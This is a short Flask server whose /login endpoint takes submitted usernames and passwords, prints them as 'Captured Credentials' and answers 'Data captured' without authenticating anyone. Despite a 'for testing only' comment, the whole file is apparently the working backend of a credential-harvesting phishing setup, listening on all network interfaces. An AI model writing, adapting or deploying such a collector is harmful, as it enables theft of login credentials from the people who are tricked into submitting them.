from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    data = request.form  # Capture login credentials
    username = data.get("username")
    password = data.get("password")

    # Log captured credentials (For testing only)
    print(f"Captured Credentials - Username: {username}, Password: {password}")

    return jsonify({"status": "success", "message": "Data captured"})

if __name__ == "__main__":
    from os import environ
    app.run(host="0.0.0.0", port=int(environ.get("PORT", 5000)))
